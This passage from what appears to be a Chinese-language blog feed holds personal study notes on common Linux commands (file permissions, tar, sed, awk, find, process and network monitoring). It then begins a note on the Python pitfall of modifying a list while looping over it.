class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">ll # 或者ls -l <br>-rw-r--r-- 1 user group  4096 Jan  1 10:00 file.txt<br>drwxr-xr-x 2 user group  4096 Jan  1 10:00 directory<br>d # 代表是目录<br>rwx #第一组（rwx） 表示所有者的权限，r读 w写 x执行<br>xr # 第二组（xr）同组用户的权限<br>x # 第三组(x) 表示其他用户，非同组用户的权限<br>user # 所属用户<br>group # 用户所属组<br>chmod +x # 添加执行权限<br>chmod 777  # 添加所有权限<br></code></pre></td></tr></table></figure><p>添加管理用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">useradd user1 # 添加用户1<br>id user1 # 查看用户所属信息<br>uid=1001(user1) gid=1001(user1) 组=1001(user1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),1000(wang),136(sambashare)<br>useradd -g root user2 # 为新添加的用户添加组<br>useradd -d /etc/nologin -g apache -s /bin/false user1<br>passwd user3 # 更改或者设置用户密码<br></code></pre></td></tr></table></figure><h1 id="四、压缩文件操作"><a href="#四、压缩文件操作" class="headerlink" title="四、压缩文件操作"></a>四、压缩文件操作</h1><h2 id="4-1-打包和压缩"><a href="#4-1-打包和压缩" class="headerlink" title="4.1 打包和压缩"></a>4.1 打包和压缩</h2><p>linux 中一般都是打包tar 文件  压缩就是gz文件</p><p>而一般情况下打包盒压缩是一起进行的，打包并且压缩后的文件的后缀名一般是.tar.gz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -zcvf [打包后的文件名.tar] [要打包的文件] # 打包<br>-z # z就是gz 调用gzip 压缩命令进行压缩<br>-c # 打包文件 就是tar的作用<br>-v # 显示打包运行的过程（跑代码）<br>-f # 指定文件名<br>tar -zcvf test.tar test.py<br><span class="hljs-meta prompt_"># </span><span class="language-bash">解压</span><br>tar -zxvf [压缩文件名] <br>-x # x 就是解压缩质量<br></code></pre></td></tr></table></figure><h1 id="五、查找命令及三剑客【重点】"><a href="#五、查找命令及三剑客【重点】" class="headerlink" title="五、查找命令及三剑客【重点】"></a>五、查找命令及三剑客【重点】</h1><h2 id="5-1-grep-强大的文本搜索工具"><a href="#5-1-grep-强大的文本搜索工具" class="headerlink" title="5.1 grep 强大的文本搜索工具"></a>5.1 grep 强大的文本搜索工具</h2><h2 id="5-2-sed-（Stream-Editor）简单介绍"><a href="#5-2-sed-（Stream-Editor）简单介绍" class="headerlink" title="5.2 sed （Stream Editor）简单介绍"></a>5.2 sed （Stream Editor）简单介绍</h2><p>Stream Editor 流编辑器 ，用于对文本进行转换、替换、删除、插入和打印</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sed 有两种模式 -e 不修改生产新文本 -i修改文件内容</span><br>sed -e &#x27;旧内容 新内容&#x27; xx文件 # 不修改文件内容 用-e<br>sed -i &#x27;旧内容 新内容&#x27; xx文件 # 修改文件内容 用-i<br>sed -e 后面可以接指令<br>a # 新增<br>c # 取代<br>d #　删除<br>i # 插入<br>p # 打印<br>Reading the configuration file, at line 416 &#x27;locale-collate &quot;&quot;&#x27;<br><br></code></pre></td></tr></table></figure><h2 id="5-3-awk-切片，强大的文本处理【重点】"><a href="#5-3-awk-切片，强大的文本处理【重点】" class="headerlink" title="5.3 awk  切片，强大的文本处理【重点】"></a>5.3 <strong>awk  切片，强大的文本处理【重点】</strong></h2><p>主要用来将数据进行切片输出的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">awk &#x27;&#123;print $1&#125;&#x27; # 用awk对内容进行进行切片，每一行，取第一个字段，以空格进行分隔<br>address: cosmos1g920yuxdmqtfxg4w8a0j9sgaazfryr2cx0d755<br><span class="hljs-meta prompt_"># </span><span class="language-bash">取出address的值</span><br>awk ‘/address/&#123;print $2&#125;’  #得到cosmos1g920yuxdmqtfxg4w8a0j9sgaazfryr2cx0d755<br>原理是：其中 `/address/` 表示匹配包含 `address` 的行，`&#123;print $2&#125;` 表示输出该行的第二个字段。输出结果为 `cosmos1g920yuxdmqtfxg4w8a0j9sgaazfryr2cx0d755`<br><span class="hljs-meta prompt_">$</span><span class="language-bash">2 里面的2可以换成1、3、4等任何数字，数字表示你匹配到的字段的后几位开始的数据，例如你匹配到的cosmosxxxxxx是在address的后面的3个字符后才出现的，那就是<span class="hljs-variable">$3</span> 第四个字符出现的就是<span class="hljs-variable">$4</span>，以此类推</span><br></code></pre></td></tr></table></figure><p>比如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker ps <br>CONTAINER ID   IMAGE                             COMMAND                   CREATED       STATUS                  PORTS                                                           NAMES<br>a7a584dfd04a   django-vue-admin_dvadmin-django   &quot;/backend/docker_sta…&quot;   13 days ago   Up Less than a second   0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp                       dvadmin-django<br>286cc8be5d9f   mysql:5.7                         &quot;docker-entrypoint.s…&quot;   13 days ago   Up Less than a second   0.0.0.0:3306-&gt;3306/tcp, :::3306-&gt;3306/tcp, 33060/tcp            dvadmin-mysql<br>1cb7df749dec   mysql:8.0.30                      &quot;docker-entrypoint.s…&quot;   2 weeks ago   Up Less than a second   33060/tcp, 0.0.0.0:3307-&gt;3306/tcp, :::3307-&gt;3306/tcp            django_mysql<br>93b06a5f97a1   portainer/portainer-ce:latest     &quot;/portainer&quot;              2 weeks ago   Up Less than a second   8000/tcp, 9443/tcp, 0.0.0.0:1009-&gt;9000/tcp, :::1009-&gt;9000/tcp   portainer<br><br>docker ps | awk &#x27;&#123;print $1&#125;&#x27; # 使用 awk 工具对前一个命令的输出进行处理，提取每行的第一个字段（以空格为分隔符），并将其打印出来<br>CONTAINER<br>a7a584dfd04a<br>286cc8be5d9f<br>1cb7df749dec<br>93b06a5f97a1<br>docker ps | awk &#x27;&#123;print $1&#125;&#x27;|tail +2  # 从第二个开始取<br>a7a584dfd04a<br>286cc8be5d9f<br>1cb7df749dec<br>93b06a5f97a1<br>docker stop $(docker ps | awk &#x27;&#123;print $1&#125;&#x27;|tail +2) # 停止容器<br></code></pre></td></tr></table></figure><h2 id="5-4-find-找文件"><a href="#5-4-find-找文件" class="headerlink" title="5.4 find 找文件"></a>5.4 find 找文件</h2><p>find命令再目录结构中搜索文件，并对搜索结果进行知道的操作</p><p>find 默认搜索当前目录机器子目录，并且<strong>不过滤任何结果（也就是返回所有文件）</strong>将它们全部显示再公屏上</p><p>所以使用find的时候最好要跟一下目标目录 一般用**-ls查找当前目录**</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">find . -name &quot;*.log&quot; -ls  在当前目录查找以.log结尾的文件，并显示详细信息。 <br>find /root/ -perm 600   查找/root/目录下权限为600的文件 <br>find . -type f -name &quot;*.log&quot;  查找当目录，以.log结尾的普通文件 <br>find . -type d | sort   查找当前所有目录并排序 <br>find . -size +100M  查找当前目录大于100M的文件<br></code></pre></td></tr></table></figure><h2 id="5-5-which"><a href="#5-5-which" class="headerlink" title="5.5 which"></a>5.5 which</h2><p>which命令的作用实在PATH变量指定的路径钟，搜索某一个系统命令的位置，并且返回第一个搜索结果一般用于查找某个指令所在的位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">which pwd # 查找pwd 命令所在的路径<br>which java # 查找PATH中java所在的路径<br>which python # 查找PATH中python所在的路径<br></code></pre></td></tr></table></figure><h2 id="5-6whereis-没用过"><a href="#5-6whereis-没用过" class="headerlink" title="5.6whereis 没用过"></a>5.6whereis 没用过</h2><p>whereis命令是定位可执行文件、源代码文件、帮助文件在文件系统中的位置。这些文件的属性应属于原始代码，二进制文件，或是帮助文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">whereis ls    将和ls文件相关的文件都查找出来<br></code></pre></td></tr></table></figure><h2 id="5-7-locate-没用过-记笔记"><a href="#5-7-locate-没用过-记笔记" class="headerlink" title="5.7 locate 没用过 记笔记"></a>5.7 locate 没用过 记笔记</h2><h1 id="六-su-和sudo"><a href="#六-su-和sudo" class="headerlink" title="六 su 和sudo"></a>六 su 和sudo</h1><h1 id="七、系统服务"><a href="#七、系统服务" class="headerlink" title="七、系统服务"></a>七、系统服务</h1><h2 id="7-1-systemctl"><a href="#7-1-systemctl" class="headerlink" title="7.1 systemctl"></a>7.1 systemctl</h2><p><code>systemctl</code> 命令用于管理 systemd 系统和服务管理器。它可以启动、停止、重启、重新加载和查询系统服务的状态。一些常用的 <code>systemctl</code> 命令包括：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start service_name # 启动服务<br>systemctl stop service_name # 停止服务<br>systemctl restart service_name # 重启服务<br>systemctl status service_name # 查看服务信息<br></code></pre></td></tr></table></figure><p>也可以用 service ，一样的意思</p><h2 id="7-2-service"><a href="#7-2-service" class="headerlink" title="7.2 service"></a>7.2 service</h2><h2 id="7-3-ps"><a href="#7-3-ps" class="headerlink" title="7.3 ps"></a>7.3 ps</h2><p>ps 查看当前正在运行的进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -e | grep process_name # 查看指定进程名<br>ps -ef  # 列出当前的所有进程，静态的<br>ps -aux | grep  process_name # aux 显示所有进程及其详情信息包括其他用户的进程，一般配合grep  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">三个命令一样的</span><br></code></pre></td></tr></table></figure><h2 id="7-4-端口"><a href="#7-4-端口" class="headerlink" title="7.4 端口"></a>7.4 端口</h2><p><code>netstat</code>：<code>netstat</code> 命令用于显示网络连接、路由表和网络接口信息。你可以使用不同的选项来过滤和显示特定的网络信息。一些常用的 <code>netstat</code> 命令选项包括：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netstat -tuln # 显示所有正在监听的tcp 和 udp 端口 可以配合grep port_number 查找特定端口的监听进程<br></code></pre></td></tr></table></figure><p><strong>lsof</strong>： <code>losf</code>命令用于列出打开文件和网络链接的进程 【常用】</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">lsof -i:8000 # 查看8000端口有没有被占用，谁占用，显示端口详细信息<br>losf -i TCP:prot_number # 显示对应的TCP端口详情<br>losf -i UDP:prot_number # 显示对应的UDP端口详情<br></code></pre></td></tr></table></figure><p>ss:<code>ss</code>命令用户显示套接字统计信息，包括监听端口和与之相关的进程。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ss -tuln # 显示所有正在监听的TCP和UDP端口<br></code></pre></td></tr></table></figure><h2 id="7-4-内存-CPU监控之top或者htop（彩色）"><a href="#7-4-内存-CPU监控之top或者htop（彩色）" class="headerlink" title="7.4 内存&#x2F;CPU监控之top或者htop（彩色）"></a>7.4 内存&#x2F;CPU监控之top或者htop（彩色）</h2><p><code>top</code>强大的实时监控系统工具，用于查看和管理正在运行的进程以及系统的性能指标，</p><p>解读所展示参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">top <br>进程号 USER      PR  NI    VIRT    RES    SHR    %CPU  %MEM     TIME+ COMMAND<br> 87753 wang      20   0   48.8g 240336  79328 R  10.9   0.7   1141:51 com.ali+ <br> VIRT # 虚拟内存占用大小<br> RES # 物理内存占用大小<br> SHR # 共享内存占用大小<br><span class="hljs-meta prompt_"> % </span><span class="language-bash"><span class="hljs-comment"># 占用百分比</span></span><br> TIME+ # 进程累计CPU时间<br> <br></code></pre></td></tr></table></figure><p>【重点】top -p PID_number 查看指定的进程的实时占用情况</p><h2 id="7-5-内存-CPU监控之free-和vmstat"><a href="#7-5-内存-CPU监控之free-和vmstat" class="headerlink" title="7.5 内存&#x2F;CPU监控之free 和vmstat"></a>7.5 内存&#x2F;CPU监控之free 和vmstat</h2><p>free :<code>free</code>命令用于显示系统的内存使用情况，它会显示总内存、已使用内存、空闲内存等信息。</p><p>可以使用free -h 以更友好的方式显示内存大小（单位用G，默认单位是M）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">free<br>          total        used        free      shared  buff/cache   available<br>内存：   32595208    18936688     1550264     2450668    12108256    10649300<br>交换：   15999996     2212136    13787860<br>free -h <br>           total        used        free      shared  buff/cache   available<br>内存：       31Gi        17Gi       1.5Gi       2.4Gi        11Gi        10Gi<br>交换：       15Gi       2.1Gi        13Gi<br><br></code></pre></td></tr></table></figure><p><code>vmstat</code>：<code>vmstat</code> 命令用于显示虚拟内存的统计信息，包括内存、CPU、磁盘、交换等。运行 <code>vmstat 1</code> 可以每秒更新一次统计信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">vmstat<br>-----------memory---------- ---swap-- -----io---- -system-- ------cpu-----<br> r  b 交换 空闲 缓冲 缓存   si   so    bi    bo   in   cs us sy id wa st<br> 0  0 2212136 1595296 1335748 10787504    0    0     2    14    2    1  3  1 96  0  0<br></code></pre></td></tr></table></figure><h2 id="7-6-使用网络流量统计"><a href="#7-6-使用网络流量统计" class="headerlink" title="7.6 使用网络流量统计"></a>7.6 使用网络流量统计</h2><p>ifconfig : <code>ifconfig</code>用于查看网络接口配置信息，也可以查看发送【上传】和接收【下载】数据包的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">ifconfig<br>enp4s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.0.120  netmask 255.255.255.0  broadcast 192.168.0.255<br>        inet6 fe80::5a11:22ff:fe47:c52e  prefixlen 64  scopeid 0x20&lt;link&gt;<br>        ether 58:11:22:47:c5:2e  txqueuelen 1000  (以太网)<br>        RX packets 22011398  bytes 12495616225 (12.4 GB)<br>        RX errors 0  dropped 154785  overruns 0  frame 0<br>        TX packets 11342485  bytes 5780291167 (5.7 GB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br>enp4s0 # 网络接口名称，网卡名称<br>flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; <br><span class="hljs-meta prompt_">#</span><span class="language-bash">4163标志 up启动，BROADCAST广播，RUNNING运行，MULTICAST接口支持多广播</span><br>inet 192.168.0.120 # 本机ip 也就是接口的IPv4地址<br>netmask 255.255.255.0 # 接口子望掩码，用于确定网络地址和主机地址的界限<br>broadcast 192.168.0.255 # 接口的广播地址，用于向同一子网中的所有主机发送广播消息。<br>ether 58:11:22:47:c5:2e  # 本机mac地址，物理地址<br>txqueuelen 1000(以太网)：# 发送队列长度，指定接口发送数据包的队列的最大长度<br>RX packets 22011398  # RX是接收，接收包的数量 接收就是【下载】<br>bytes 12495616225 (12.4 GB) # 接受包的字节数，也就是接收包耗流量 【下载】<br>RX errors 0  # 接收过程中的错误数<br>dropped 154785 # 接收过程中的丢包数<br>overruns 0 # 接收过程中的溢出数据包数<br>frame 0 # 接收过程中的帧错误数量<br>TX packets 11342485  # TX是发送，发送包的数量 【上传】<br>bytes 5780291167 (5.7 GB) # 接受包的字节数，也就是接受包耗流量【上传】<br>TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br><br></code></pre></td></tr></table></figure><p><strong>netstat -i</strong> ： <code>netstat -i</code> 用于显示网络接口的统计信息。它会列出系统上所有网络接口的详细信息，包括接口名称、MTU（最大传输单元）、接收和发送的数据包数量、错误数量等【重点】【统计用】</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">netstat -i  # 这个看的更直观<br>Kernel Interface table<br>Iface      MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg<br>br-0bc39  1500        0      0      0 0            73      0      0      0 BMU<br>br-31a15  1500        0      0      0 0             0      0      0      0 BMU<br>br-701c9  1500        0      0      0 0             0      0      0      0 BMU<br>br-cbf44  1500        0      0      0 0            71      0      0      0 BMU<br>docker0   1500    23665      0      0 0         41823      0      0      0 BMRU<br>enp4s0    1500 22050803      0 155200 0      11352806      0      0      0 BMRU<br>lo       65536  8078343      0      0 0       8078343      0      0      0 LRU<br>veth9712  1500    18992      0      0 0         35983      0      0      0 BMRU<br></code></pre></td></tr></table></figure><p>ip a 现在不用ifconfig 这个命令比较老，用ip a 也是一样的，因为ip 集成了很多东西在里面</p><p>nethogs : <code>nethogs</code>可以实时监控网络流量，会像抓包一样实时的显示每个进程的网络使用情况，这个要装的</p><p>iftop:<code>iftop</code>工具可以实时监听当前网络流量和统计发送接收总量</p><p>sudo iftop -P -F <process_id > :实时监听对应进程的网络流量和统计发送接收总量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo iftop  # 监听和统计全部流量<br>sudo iftop -P -F 4785 # 监听和统计单个进程的流程数据<br></code></pre></td></tr></table></figure><p>tcpdump ：<code>tcpdump</code> 抓包本机所有网络请求接收，如果要抓包筛选的话，可以用Wireshark工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">tshark -r capture.pcap -Y &quot;&lt;filter_expression&gt;&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">将 `&lt;filter_expression&gt;` 替换为你想要使用的过滤表达式，例如 `http.request` 或 `tcp.port == 80`。你还可以添加进程名称或进程 ID 过滤条件，以限制结果只包含特定进程的流量。</span><br></code></pre></td></tr></table></figure><h3 id="流畅度-【这个要去看一下详解后做笔记】"><a href="#流畅度-【这个要去看一下详解后做笔记】" class="headerlink" title="流畅度 【这个要去看一下详解后做笔记】"></a>流畅度 【这个要去看一下详解后做笔记】</h3><h3 id="功耗-【这个要去看一下详解后做笔记】"><a href="#功耗-【这个要去看一下详解后做笔记】" class="headerlink" title="功耗 【这个要去看一下详解后做笔记】"></a>功耗 【这个要去看一下详解后做笔记】</h3><h3 id="网络抓包tcpdump【这个要去看一下详解后做笔记】"><a href="#网络抓包tcpdump【这个要去看一下详解后做笔记】" class="headerlink" title="网络抓包tcpdump【这个要去看一下详解后做笔记】"></a>网络抓包tcpdump【这个要去看一下详解后做笔记】</h3><h1 id="八、网络管理"><a href="#八、网络管理" class="headerlink" title="八、网络管理"></a>八、网络管理</h1><h1 id="九、定时任务"><a href="#九、定时任务" class="headerlink" title="九、定时任务"></a>九、定时任务</h1><h1 id="十、其他"><a href="#十、其他" class="headerlink" title="十、其他"></a>十、其他</h1><p><img src="/../img/pexels.jpg" alt="pexels"></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】读书笔记之常见陷阱（八）</title>
    <link href="/2024/01/08/618python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%B8%B8%E8%A7%81%E9%99%B7%E9%98%B1%EF%BC%88%E5%85%AB%EF%BC%89/"/>
    <url>/2024/01/08/618python%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%B8%B8%E8%A7%81%E9%99%B7%E9%98%B1%EF%BC%88%E5%85%AB%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="八-常见的Python陷阱"><a href="#八-常见的Python陷阱" class="headerlink" title="八　常见的Python陷阱"></a>八　常见的Python陷阱</h1><h2 id="8-1-循环列表的同时不要增删其中的元素"><a href="#8-1-循环列表的同时不要增删其中的元素" class="headerlink" title="8.1　循环列表的同时不要增删其中的元素"></a>8.1　循环列表的同时不要增删其中的元素</h2><p>使用<code>for</code>或<code>while</code>在列表上进行循环（也就是迭代）的同时增删其中的元素很可能会导致错误。想想这种情况：你要迭代一个包含各种描述衣服的字符串的列表，希望每次发现<code>&#39;sock&#39;</code>时插入另一个<code>&#39;sock&#39;</code>，从而保证列表中的<code>&#39;sock&#39;</code>数是偶数。这个任务看起来很简单：遍历列表中的字符串，当发现某个字符串包含<code>&#39;sock&#39;</code>时（比如<code>&#39;red sock&#39;</code>），在列表后添加另外一个<code>&#39;red sock&#39;</code>字符串。</p><p>但以下这段代码并不奏效。它陷入了死循环，必须使用CTRL-C才能中断：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>clothes = [<span class="hljs-string">&#x27;skirt&#x27;</span>, <span class="hljs-string">&#x27;red sock&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> clothing <span class="hljs-keyword">in</span> clothes: <span class="hljs-comment"># 迭代列表</span><br><span class="hljs-meta">... </span>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;sock&#x27;</span> <span class="hljs-keyword">in</span> clothing: <span class="hljs-comment"># 寻找含有&#x27;sock&#x27;的字符串</span><br><span class="hljs-meta">... </span>        clothes.append(clothing) <span class="hljs-comment"># 添加&#x27;sock&#x27;</span><br><span class="hljs-meta">... </span>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Added a sock:&#x27;</span>, clothing) <span class="hljs-comment"># 告知用户</span><br>...<br>Added a sock: red sock<br>Added a sock: red sock<br>Added a sock: red sock<br>--snip--<br>Added a sock: red sock<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">3</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>KeyboardInterrupt<br></code></pre></td></tr></table></figure><p>　　问题在于，当你把<code>&#39;red sock&#39;</code>追加到<code>clothes</code>列表中时，列表多出了第3项，需要被迭代的列表变成了<code>[&#39;skirt&#39;, &#39;red sock&#39;, &#39;red sock&#39;]</code>。在下一次迭代中，<code>for</code>循环遍历到了第2个<code>&#39;red sock&#39;</code>，同样的故事继续重演，它又追加了一个<code>&#39;red sock&#39;</code>字符串，列表变为<code>[&#39;skirt&#39;, &#39;red sock&#39;, &#39;red sock&#39;，&#39;red sock&#39;]</code>。这样一来，Python又需要多遍历一个字符串，如图8-1所示。这就是为什么我们看到控制台总是输出<code>&quot;Added a sock: red sock&quot;</code>。这种循环只有在计算机内存耗尽以至于程序崩溃或者按CTRL-C中断时才会停止。</p><p><strong>在<code>for</code>循环的每一次迭代中，都有一个新的<code>&#39;red sock&#39;</code>被追加到列表中，作为下一次迭代的指向，形成死循环</strong></p><p>　　要点是不要在迭代列表的时候将元素添加进列表。应该使用一个单独的列表作为修改后的列表，比如这个例子中的<code>newClothes</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>clothes = [<span class="hljs-string">&#x27;skirt&#x27;</span>, <span class="hljs-string">&#x27;red sock&#x27;</span>, <span class="hljs-string">&#x27;blue sock&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>newClothes = []<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> clothing <span class="hljs-keyword">in</span> clothes:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;sock&#x27;</span> <span class="hljs-keyword">in</span> clothing:<br><span class="hljs-meta">... </span>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Appending:&#x27;</span>, clothing)<br><span class="hljs-meta">... </span>        newClothes.append(clothing) <span class="hljs-comment"># 我们修改newClothes列表，而非clothes列表</span><br>...<br>Appending: red sock<br>Appending: blue sock<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(newClothes)<br>[<span class="hljs-string">&#x27;red sock&#x27;</span>, <span class="hljs-string">&#x27;blue sock&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>clothes.extend(newClothes) <span class="hljs-comment"># 将newClothes中的项添加到clothes中</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(clothes)<br>[<span class="hljs-string">&#x27;skirt&#x27;</span>, <span class="hljs-string">&#x27;red sock&#x27;</span>, <span class="hljs-string">&#x27;blue sock&#x27;</span>, <span class="hljs-string">&#x27;red sock&#x27;</span>, <span class="hljs-string">&#x27;blue sock&#x27;</span>]<br></code></pre></td></tr></table></figure><p><strong>当循环删除<code>&#39;mello&#39;</code>时，列表中的元素索引减1，导致索引<code>i</code>跳过了<code>&#39;yello&#39;</code></strong></p><p>　　正确的做法是复制不想删除的项到一个新的列表，再用它替换原来的列表。在交互式shell中输入以下代码，可以得到前一个例子的正确版本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>greetings = [<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;mello&#x27;</span>, <span class="hljs-string">&#x27;yello&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>newGreetings = []<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> greetings:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">if</span> word == <span class="hljs-string">&#x27;hello&#x27;</span>: <span class="hljs-comment"># 复制是&#x27;hello&#x27;的每一项</span><br><span class="hljs-meta">... </span> 